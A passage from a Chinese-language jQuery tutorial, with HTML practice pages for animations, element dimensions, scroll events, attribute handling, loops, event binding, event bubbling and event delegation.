&lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;input type="button" name="" value="动画" id="btn"&gt; &lt;div class="box"&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;7. jquery链式调用jquery对象的方法会在执行完后返回这个jquery对象，所有jquery对象的方法可以连起来写1234567$('#div1') // id为div1的元素.children('ul') //该元素下面的ul子元素.slideDown('fast') //高度从零变到实际高度来显示ul元素.parent() //跳到ul的父元素，也就是id为div1的元素.siblings() //跳到div1元素平级的所有兄弟元素.children('ul') //这些兄弟元素中的ul子元素.slideUp('fast'); //高度实际高度变换到零来隐藏ul元素7.1 层级菜单练习123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;层级菜单&lt;/title&gt; &lt;script type="text/javascript" src="js/jquery-3.3.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; $(function () &#123; $('.level1').click(function () &#123; //当前点击的元素紧挨的同辈元素向下展开，再跳到此元素的父级(li),再跳到此父级的其他的同辈元素(li),选择其他同辈元素(li)的子元素ul，然后将它向上收起。 // 通过stop() 可以修正反复点击导致的持续动画的问题 $(this).next().stop().slideToggle().parent().siblings().children('ul').slideUp(); &#125;); &#125;); &lt;/script&gt; &lt;style type="text/css"&gt; body &#123; font-family: 'Microsoft Yahei'; &#125; body, ul &#123; margin: 0px; padding: 0px; &#125; ul &#123; list-style: none; &#125; .menu &#123; width: 200px; margin: 20px auto 0; &#125; .menu .level1, .menu li ul a &#123; display: block; width: 200px; height: 30px; line-height: 30px; text-decoration: none; background-color: #3366cc; color: #fff; font-size: 16px; text-indent: 10px; &#125; .menu .level1 &#123; border-bottom: 1px solid #afc6f6; &#125; .menu li ul a &#123; font-size: 14px; text-indent: 20px; background-color: #7aa1ef; &#125; .menu li ul li &#123; border-bottom: 1px solid #afc6f6; &#125; .menu li ul &#123; display: none; &#125; .menu li ul.current &#123; display: block; &#125; .menu li ul li a:hover &#123; background-color: #f6b544; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;ul class="menu"&gt; &lt;li&gt; &lt;a href="#" class="level1"&gt;水果&lt;/a&gt; &lt;ul class="current"&gt; &lt;li&gt;&lt;a href="#"&gt;苹果&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="#"&gt;梨子&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="#"&gt;葡萄&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="#"&gt;火龙果&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/li&gt; &lt;li&gt; &lt;a href="#" class="level1"&gt;海鲜&lt;/a&gt; &lt;ul&gt; &lt;li&gt;&lt;a href="#"&gt;蛏子&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="#"&gt;扇贝&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="#"&gt;龙虾&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="#"&gt;象拔蚌&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/li&gt; &lt;li&gt; &lt;a href="#" class="level1"&gt;肉类&lt;/a&gt; &lt;ul&gt; &lt;li&gt;&lt;a href="#"&gt;内蒙古羊肉&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="#"&gt;进口牛肉&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="#"&gt;野猪肉&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/li&gt; &lt;li&gt; &lt;a href="#" class="level1"&gt;蔬菜&lt;/a&gt; &lt;ul&gt; &lt;li&gt;&lt;a href="#"&gt;娃娃菜&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="#"&gt;西红柿&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="#"&gt;西芹&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="#"&gt;胡萝卜&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/li&gt; &lt;li&gt; &lt;a href="#" class="level1"&gt;速冻&lt;/a&gt; &lt;ul&gt; &lt;li&gt;&lt;a href="#"&gt;冰淇淋&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="#"&gt;湾仔码头&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="#"&gt;海参&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="#"&gt;牛肉丸&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/li&gt;&lt;/ul&gt;&lt;/body&gt;&lt;/html&gt;8. jquery动画通过animate方法可以设置元素某属性值上的动画，可以设置一个或多个属性值，动画执行完成后会执行一个函数。1234567891011121314$('#div1').animate(&#123; width:300, height:300&#125;,1000,'swing',function()&#123; alert('done!');&#125;);// 参数可以写成数字表达式$('#div1').animate(&#123; width:'+=100', // 每次加100 height:300&#125;,1000,'swing',function()&#123; alert('done!');&#125;);8.1 jquery动画12345678910111213141516171819202122232425262728293031323334353637383940&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;script type="text/javascript" src="js/jquery-3.3.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; $(function()&#123; $('#btn').click(function()&#123; $('.box').animate(&#123;'width':600&#125;,1000,function()&#123; $('.box').animate(&#123;'height':400&#125;,1000,function()&#123; $('.box').animate(&#123;'opacity':0&#125;); // 透明度变成0 &#125;); &#125;); &#125;); $('#btn2').click(function()&#123; $('.box2').stop().animate(&#123;'width':'+=100'&#125;); &#125;); &#125;); &lt;/script&gt; &lt;style type="text/css"&gt; .box,.box2&#123; width:100px; height:100px; background-color:gold; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;input type="button" name="" value="动画" id="btn"&gt; &lt;div class="box"&gt;&lt;/div&gt; &lt;br /&gt; &lt;br /&gt; &lt;input type="button" name="" value="动画" id="btn2"&gt; &lt;div class="box2"&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;8.2 滑动选项卡123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;script type="text/javascript" src="js/jquery-3.3.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; $(function () &#123; var $btn = $('.btns input'); var $slides = $('.cons .slides'); $btn.click(function () &#123; // this 指的是原生的this，它表示当前点击的对象，使用jquery的对象需要用$(this) // 当前点击的按钮加上current样式后，除了当前，其他的按钮去掉current样式 $(this).addClass('current').siblings().removeClass('current'); $slides.stop().animate(&#123;'left': -500 * $(this).index()&#125;); &#125;) &#125;) &lt;/script&gt; &lt;style type="text/css"&gt; .btns input &#123; width: 100px; height: 40px; background-color: #ddd; border: 0; outline: none; &#125; .btns .current &#123; background-color: gold; &#125; .cons &#123; width: 500px; height: 300px; overflow: hidden; position: relative; &#125; .slides &#123; width: 1500px; height: 300px; position: absolute; left: 0; top: 0; &#125; .cons .slides div &#123; width: 500px; height: 300px; background-color: gold; text-align: center; line-height: 300px; font-size: 30px; float: left; &#125; .cons .active &#123; display: block; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;div class="btns"&gt; &lt;input type="button" name="" value="01" class="current"&gt; &lt;input type="button" name="" value="02"&gt; &lt;input type="button" name="" value="03"&gt;&lt;/div&gt;&lt;div class="cons"&gt; &lt;div class="slides"&gt; &lt;div&gt;选项卡一的内容&lt;/div&gt; &lt;div&gt;选项卡二的内容&lt;/div&gt; &lt;div&gt;选项卡三的内容&lt;/div&gt; &lt;/div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;9. 尺寸相关、滚动事件9.1 获取和设置元素的尺寸1234width()、height() 获取元素width和height innerWidth()、innerHeight() 包括padding的width和height outerWidth()、outerHeight() 包括padding和border的width和height outerWidth(true)、outerHeight(true) 包括padding和border以及margin的width和height1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;script type="text/javascript" src="js/jquery-3.3.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; $(function()&#123; var $div = $('.box'); // 盒子内容的尺寸 console.log($div.width()); console.log($div.height()); // 盒子内容加上padding的尺寸 console.log($div.innerWidth()); console.log($div.innerHeight()); //盒子的真实尺寸，内容尺寸+padding+border console.log($div.outerWidth()); console.log($div.outerHeight()); // 盒子的真实尺寸再加上margin console.log($div.outerWidth(true)); console.log($div.outerHeight(true)); &#125;) &lt;/script&gt; &lt;style type="text/css"&gt; .box&#123; width:300px; height:200px; padding:20px; border:10px solid #000; margin:20px; background-color:gold; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="box"&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;9.2 获取元素相对页面的绝对位置1offset()12345678910111213141516171819202122232425262728293031&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;script type="text/javascript" src="js/jquery-3.3.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; $(function () &#123; var $div = $('.box'); $div.click(function () &#123; var oPos = $div.offset(); document.title = oPos.left + "|" + oPos.top; // 在标题栏面显示出来 console.log(oPos); &#125;); &#125;) &lt;/script&gt; &lt;style type="text/css"&gt; .box &#123; width: 200px; height: 200px; background-color: gold; margin: 50px auto 0; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="box"&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;9.2-1 加入购物车动画练习12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;script type="text/javascript" src="js/jquery-3.3.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; $(function () &#123; var $chart = $('.chart'); var $count = $('.chart em'); var $btn = $('.add'); var $point = $('.point'); var $w01 = $btn.outerWidth(); var $h01 = $btn.outerHeight(); var $w02 = $chart.outerWidth(); var $h02 = $chart.outerHeight(); $btn.click(function () &#123; var oPos01 = $btn.offset(); var oPos02 = $chart.offset(); $point.css(&#123;'left': oPos01.left + parseInt($w01 / 2) - 8, 'top': oPos01.top + parseInt($h01 / 2) - 8&#125;); $point.show(); $point.stop().animate(&#123; 'left': oPos02.left + parseInt($w02 / 2) - 8, 'top': oPos02.top + parseInt($h02 / 2) - 8 &#125;, 800, function () &#123; $point.hide(); var iNum = $count.html(); $count.html(parseInt(iNum) + 1); &#125;); &#125;) &#125;); &lt;/script&gt; &lt;style type="text/css"&gt; .chart &#123; width: 150px; height: 50px; border: 2px solid #000; text-align: center; line-height: 50px; float: right; margin-right: 100px; margin-top: 50px; &#125; .chart em &#123; font-style: normal; color: red; font-weight: bold; &#125; .add &#123; width: 100px; height: 50px; background-color: green; border: 0; color: #fff; float: left; margin-top: 300px; margin-left: 300px; &#125; .point &#123; width: 16px; height: 16px; background-color: red; position: fixed; left: 0; top: 0; display: none; z-index: 9999; border-radius: 50%; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;div class="chart"&gt;购物车&lt;em&gt;0&lt;/em&gt;&lt;/div&gt;&lt;input type="button" name="" value="加入购物车" class="add"&gt;&lt;div class="point"&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;9.3 获取浏览器可视区宽度高度12$(window).width();$(window).height();9.4 获取页面文档的宽度高度如果页面有滚动条，则页面文档的高度大于浏览器可视区高度12$(document).width();$(document).height();9.5 获取页面滚动距离12$(document).scrollTop(); $(document).scrollLeft();9.6 页面滚动事件123$(window).scroll(function()&#123; ...... &#125;)9.6-1 置顶菜单和滚动到顶部练习123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;script type="text/javascript" src="js/jquery-3.3.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; $(function () &#123; $menu = $('.menu'); $menu_back = $('.menu_back'); $totop = $('.totop'); $(window).scroll(function () &#123; //console.log('abc'); var iNum = $(document).scrollTop(); //document.title = iNum; if (iNum &gt; 200) &#123; $menu.css(&#123; 'position': 'fixed', 'left': '50%', 'top': 0, 'marginLeft': -480 &#125;); $menu_back.show(); &#125; else &#123; $menu.css(&#123; 'position': 'static', 'marginLeft': 'auto' &#125;); $menu_back.hide(); &#125; if (iNum &gt; 400) &#123; $totop.fadeIn(); &#125; else &#123; $totop.fadeOut(); &#125; &#125;); $totop.click(function () &#123; $('html,body').animate(&#123;'scrollTop': 0&#125;); &#125;); &#125;) &lt;/script&gt; &lt;style type="text/css"&gt; body &#123; margin: 0; &#125; .banner &#123; width: 960px; height: 200px; background-color: cyan; margin: 0 auto; &#125; .menu &#123; width: 960px; height: 80px; background-color: gold; margin: 0 auto; text-align: center; line-height: 80px; &#125; .menu_back &#123; width: 960px; height: 80px; margin: 0 auto; display: none; &#125; p &#123; text-align: center; color: red; &#125; .totop &#123; width: 60px; height: 60px; background-color: #000; color: #fff; position: fixed; right: 20px; bottom: 50px; line-height: 60px; text-align: center; font-size: 40px; border-radius: 50%; cursor: pointer; display: none; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;div class="banner"&gt;&lt;/div&gt;&lt;div class="menu"&gt;菜单&lt;/div&gt;&lt;div class="menu_back"&gt;&lt;/div&gt;&lt;div class="totop"&gt;↑&lt;/div&gt;&lt;p&gt;文档内容&lt;/p&gt;&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;..........&lt;/body&gt;&lt;/html&gt;10. jquery属性操作10.1 html() 取出或设置html内容12345// 取出html内容var $htm = $('#div1').html();// 设置html内容$('#div1').html('&lt;span&gt;添加文字&lt;/span&gt;');10.2 prop() 取出或设置某个属性的值12345// 取出图片的绝对地址地址var $src = $('#img1').prop('src');// 设置图片的地址和alt属性$('#img1').prop(&#123;src: "test.jpg", alt: "Test Image" &#125;);1234567891011121314151617181920212223242526272829303132333435363738394041&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;script type="text/javascript" src="js/jquery-3.3.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; $(function()&#123; var $a = $('.link'); var $img = $('#img01'); var $div = $('#div1'); // 读取class属性值 console.log( $a.prop('class')); // link // 没有设置的属性读取为空 console.log($a.prop('title')); // 获取是图片的绝对地址 console.log($img.prop('src')); //alert($img.prop('src')); // 设置属性 $a.prop(&#123;'href':'http://www.baidu.com','title':'百度网链接'&#125;); //console.log($a.prop('title')); //读取标签内包含的内容 console.log($a.html()); // 写入标签的内容，会代替原来的内容 $div.html('&lt;span&gt;div里面的span元素&lt;/span&gt;'); // &lt;span&gt;div里面的span元素&lt;/span&gt; &#125;) &lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;a href="#" class="link"&gt;这是一个链接&lt;/a&gt; &lt;img src="images/002.jpg" id="img01" alt="水果"&gt; &lt;div id="div1"&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;11. jquery循环对jquery选择的对象集合分别进行操作，需要用到jquery循环操作，此时可以用对象上的each方法12345678910111213141516$(function () &#123; $('.list li').each(function (i) &#123; alert(i); // 弹出li标签里面的值 // alert($(this).index()); // 弹出li标签里面的值的索引 // alert($(this).html(i)); // 弹出object对象 &#125;);&#125;);......&lt;ul class="list"&gt; &lt;li&gt;1&lt;/li&gt; &lt;li&gt;2&lt;/li&gt; &lt;li&gt;3&lt;/li&gt; &lt;li&gt;4&lt;/li&gt; &lt;li&gt;5&lt;/li&gt; &lt;li&gt;6&lt;/li&gt;&lt;/ul&gt;11.1 手风琴练习123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112&lt;!doctype html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;script type="text/javascript" src="js/jquery-3.3.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; $(function () &#123; var $li = $('#accordion li'); $li.click(function () &#123; //alert($(this).html()); $(this).animate(&#123;'left': 21 * $(this).index()&#125;); //点击的li前面的li向左运动到各自的位置 $(this).prevAll().each(function () &#123; //这里的$(this)指的是循环选择的每个li $(this).animate(&#123;'left': 21 * $(this).index()&#125;); &#125;); // 第5个li在右边的left值 727-21*1 等同于 727-21*(5-$(this).index()) // 第4个li在右边的left值 727-21*2 等同于 727-21*(5-$(this).index()) // 第3个li在右边的left值 727-21*3 等同于 727-21*(5-$(this).index()) $(this).nextAll().each(function () &#123; $(this).animate(&#123;'left': 727 - 21 * (5 - $(this).index())&#125;); &#125;); &#125;) &#125;) &lt;/script&gt; &lt;style&gt; * &#123; margin: 0; padding: 0; &#125; body &#123; font-size: 12px; &#125; #accordion &#123; width: 727px; height: 350px; margin: 100px auto 0 auto; position: relative; overflow: hidden; border: 1px solid #CCC; &#125; #accordion ul &#123; list-style: none; &#125; #accordion ul li &#123; width: 643px; height: 350px; position: absolute; background: #FFF; &#125; #accordion ul li span &#123; display: block; width: 20px; height: 350px; float: left; text-align: center; color: #FFF; padding-top: 5px; cursor: pointer; &#125; #accordion ul li img &#123; display: block; float: right; &#125; .bar01 &#123; left: 0px; &#125; .bar02 &#123; left: 643px; &#125; .bar03 &#123; left: 664px; &#125; .bar04 &#123; left: 685px; &#125; .bar05 &#123; left: 706px; &#125; .bar01 span &#123; background: #09E0B5; &#125; .bar02 span &#123; background: #3D7FBB; &#125; .bar03 span &#123; background: #5CA716; &#125; .bar04 span &#123; background: #F28B24; &#125; .bar05 span &#123; background: #7C0070; &#125; &lt;/style&gt; &lt;title&gt;手风琴效果&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;div id="accordion"&gt; &lt;ul&gt; &lt;li class="bar01"&gt;&lt;span&gt;非洲景色01&lt;/span&gt;&lt;img src="images/001.jpg" /&gt;&lt;/li&gt; &lt;li class="bar02"&gt;&lt;span&gt;非洲景色02&lt;/span&gt;&lt;img src="images/002.jpg" /&gt;&lt;/li&gt; &lt;li class="bar03"&gt;&lt;span&gt;非洲景色03&lt;/span&gt;&lt;img src="images/003.jpg" /&gt;&lt;/li&gt; &lt;li class="bar04"&gt;&lt;span&gt;非洲景色04&lt;/span&gt;&lt;img src="images/004.jpg" /&gt;&lt;/li&gt; &lt;li class="bar05"&gt;&lt;span&gt;非洲景色05&lt;/span&gt;&lt;img src="images/005.jpg" /&gt;&lt;/li&gt; &lt;/ul&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;12. jquery事件12.1 事件函数列表123456789101112blur() 元素失去焦点focus() 元素获得焦点click() 鼠标单击mouseover() 鼠标进入（进入子元素也触发）mouseout() 鼠标离开（离开子元素也触发）mouseenter() 鼠标进入（进入子元素不触发）mouseleave() 鼠标离开（离开子元素不触发）hover() 同时为mouseenter和mouseleave事件指定处理函数ready() DOM加载完成resize() 浏览器窗口的大小发生改变scroll() 滚动条的位置发生变化submit() 用户递交表单12.2 绑定事件的其他方式12345$(function()&#123; $('#div1').bind('mouseover click', function(event) &#123; alert($(this).html()); &#125;);&#125;);12.3 取消绑定事件123456789$(function()&#123; $('#div1').bind('mouseover click', function(event) &#123; alert($(this).html()); // $(this).unbind(); $(this).unbind('mouseover'); &#125;);&#125;);12345678910111213141516171819202122232425262728293031&lt;!doctype html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;script type="text/javascript" src="js/jquery-3.3.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; /* $(function () &#123; $("#btn").click(function () &#123; alert('click事件'); &#125;); &#125;); */ // 点击或者鼠标移入的时候都执行绑定的函数 $(function () &#123; $("#btn").bind('click mouseover',function () &#123; alert('bind绑定click事件和mouseover鼠标移入事件'); $(this).unbind('mouseover'); &#125;); &#125;); &lt;/script&gt; &lt;title&gt;Documet&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;input type="button" name="" value="按钮" id="btn"&gt;&lt;/body&gt;&lt;/html&gt;12.4 焦点和提交事件1234567891011121314151617181920212223242526272829303132333435363738&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;script type="text/javascript" src="js/jquery-3.3.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; $(function () &#123; // 在获得焦点的时候做什么事情 /*$('#input01').focus(function()&#123; alert('获得焦点') &#125;)*/ //focus 一般用来让input元素开始就获取焦点，只能是一个元素获得焦点 $('#input01').focus(); $('#input01').blur(function () &#123; // 获取input元素的value值用 val() var sVal = $(this).val(); alert(sVal); &#125;); $('#form1').submit(function () &#123; //alert('提交'); // 阻止默认的提交行为 return false; &#125;); &#125;) &lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;form id="form1" action="http://www.baidu.com"&gt; &lt;input type="text" name="dat01" id="input01"&gt; &lt;input type="text" name="dat02" id="input02"&gt; &lt;input type="submit" name="" value="提交" id="sub"&gt; &lt;/form&gt;&lt;/body&gt;&lt;/html&gt;12.5 鼠标移入移出事件12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;script type="text/javascript" src="js/jquery-3.3.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; $(function () &#123; // 鼠标移入，移入的子元素也会触发 $('.con').mouseover(function () &#123; alert('移入'); &#125;); $('.con').mouseout(function () &#123; alert('移出'); &#125;); // 鼠标移入，移入的子元素不会触发 /* $('.con2').mouseenter(function()&#123; alert('移入'); &#125;) $('.con2').mouseleave(function()&#123; alert('移出'); &#125;) */ // 合并成下面的写法： $('.con2').hover(function () &#123; alert('移入') &#125;, function () &#123; alert('移出') &#125;) &#125;) &lt;/script&gt; &lt;style type="text/css"&gt; .con, .con2 &#123; width: 200px; height: 200px; background-color: gold; &#125; .box, .box2 &#123; width: 100px; height: 100px; background-color: green; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="con"&gt; &lt;div class="box"&gt;&lt;/div&gt; &lt;/div&gt; &lt;br/&gt; &lt;br/&gt; &lt;br/&gt; &lt;br/&gt; &lt;div class="con2"&gt; &lt;div class="box2"&gt;&lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt;13. 事件冒泡13.1 什么是事件冒泡在一个对象上触发某类事件（比如单击onclick事件），如果此对象定义了此事件的处理程序，那么此事件就会调用这个处理程序，如果没有定义此事件处理程序或者事件返回true，那么这个事件会向这个对象的父级对象传播，从里到外，直至它被处理（父级对象所有同类事件都将被激活），或者它到达了对象层次的最顶层，即document对象（有些浏览器是window）。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;script type="text/javascript" src="js/jquery-3.3.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; $(function () &#123; // 事件冒泡依据的是标签之间的层级关系，不是标签的位置 $('.son').click(function () &#123; alert(1); &#125;); $('.father').click(function () &#123; alert(2); &#125;); $('.grandfather').click(function () &#123; alert(3); &#125;); &#125;) &lt;/script&gt; &lt;style type="text/css"&gt; .grandfather &#123; width: 300px; height: 300px; background-color: green; position: relative; &#125; .father &#123; width: 200px; height: 200px; background-color: gold; &#125; .son &#123; width: 100px; height: 100px; background-color: red; position: absolute; left: 0; top: 400px; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;div class="grandfather"&gt; &lt;div class="father"&gt; &lt;div class="son"&gt;&lt;/div&gt; &lt;/div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;13.2 事件冒泡的作用事件冒泡允许多个操作被集中处理（把事件处理器添加到一个父级元素上，避免把事件处理器添加到多个子级元素上），它还可以让你在对象层的不同级别捕获事件。13.3 阻止事件冒泡事件冒泡机制有时候是不需要的，需要阻止掉，通过 event.stopPropagation() 来阻止1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;script type="text/javascript" src="js/jquery-3.3.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; $(function () &#123; // event 是发生事件的时候的事件对象，使用的时候，通过第一个参数传进来 $('.son').click(function (event) &#123; alert(1); //通过event对象上的stopPropagation的方法阻止事件冒泡 event.stopPropagation(); &#125;); $('.father').click(function () &#123; alert(2); &#125;); $('.grandfather').click(function () &#123; alert(3); &#125;); &#125;) &lt;/script&gt; &lt;style type="text/css"&gt; .grandfather &#123; width: 300px; height: 300px; background-color: green; position: relative; &#125; .father &#123; width: 200px; height: 200px; background-color: gold; &#125; .son &#123; width: 100px; height: 100px; background-color: red; position: absolute; left: 0; top: 400px; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="grandfather"&gt; &lt;div class="father"&gt; &lt;div class="son"&gt;&lt;/div&gt; &lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt;13.4 阻止默认行为阻止表单提交123$(&apos;#form1&apos;).submit(function(event)&#123; event.preventDefault();&#125;)13.5 合并阻止操作实际开发中，一般把阻止冒泡和阻止默认行为合并起来写，合并写法可以用12345// event.stopPropagation();// event.preventDefault();// 合并写法：return false;13.6 课堂练习页面弹框（点击弹框外弹框关闭），在document上绑定一个事件123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;script type="text/javascript" src="js/jquery-3.3.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; $(function () &#123; $('#btn').click(function () &#123; $('.pop_con').fadeIn(); return false; &#125;); $(document).click(function () &#123; $('.pop_con').fadeOut(); &#125;); $('.pop').click(function () &#123; return false; &#125;); $('#close').click(function () &#123; $('.pop_con').fadeOut(); &#125;); &#125;); &lt;/script&gt; &lt;style type="text/css"&gt; .pop_con &#123; display: none; &#125; .pop &#123; position: fixed; width: 500px; height: 300px; background-color: #fff; border: 3px solid #000; left: 50%; top: 50%; margin-left: -250px; margin-top: -150px; z-index: 9999; &#125; .mask &#123; position: fixed; width: 100%; height: 100%; background-color: #000; opacity: 0.3; filter: alpha(opacity=30); left: 0; top: 0; z-index: 9990; &#125; .close &#123; float: right; font-size: 30px; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;input type="button" name="" value="弹出" id="btn"&gt; &lt;div class="pop_con"&gt; &lt;div class="pop"&gt; 弹框里面文字 投资金额：&lt;input type="text" name=""&gt; &lt;a href="#" id="close" class="close"&gt;×&lt;/a&gt; &lt;/div&gt; &lt;div class="mask"&gt;&lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt;14. 事件委托事件委托就是利用冒泡的原理，把事件加到父级上，通过判断事件来源的子集，执行相应的操作，事件委托首先可以极大减少事件绑定次数，提高性能；其次可以让新加入的子元素也可以拥有相同的操作。14.1 一般绑定事件的写法1234567891011121314$(function()&#123; $ali = $('#list li'); $ali.click(function() &#123; $(this).css(&#123;background:'red'&#125;); &#125;);&#125;)...&lt;ul id="list"&gt; &lt;li&gt;1&lt;/li&gt; &lt;li&gt;2&lt;/li&gt; &lt;li&gt;3&lt;/li&gt; &lt;li&gt;4&lt;/li&gt; &lt;li&gt;5&lt;/li&gt;&lt;/ul&gt;14.2 事件委托的写法1234567891011121314$(function()&#123; $list = $('#list'); $list.delegate('li', 'click', function() &#123; $(this).css(&#123;background:'red'&#125;); &#125;);&#125;)...&lt;ul id="list"&gt; &lt;li&gt;1&lt;/li&gt; &lt;li&gt;2&lt;/li&gt; &lt;li&gt;3&lt;/li&gt; &lt;li&gt;4&lt;/li&gt; &lt;li&gt;5&lt;/li&gt;&lt;/ul&gt;12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;Document&lt;/title&gt; 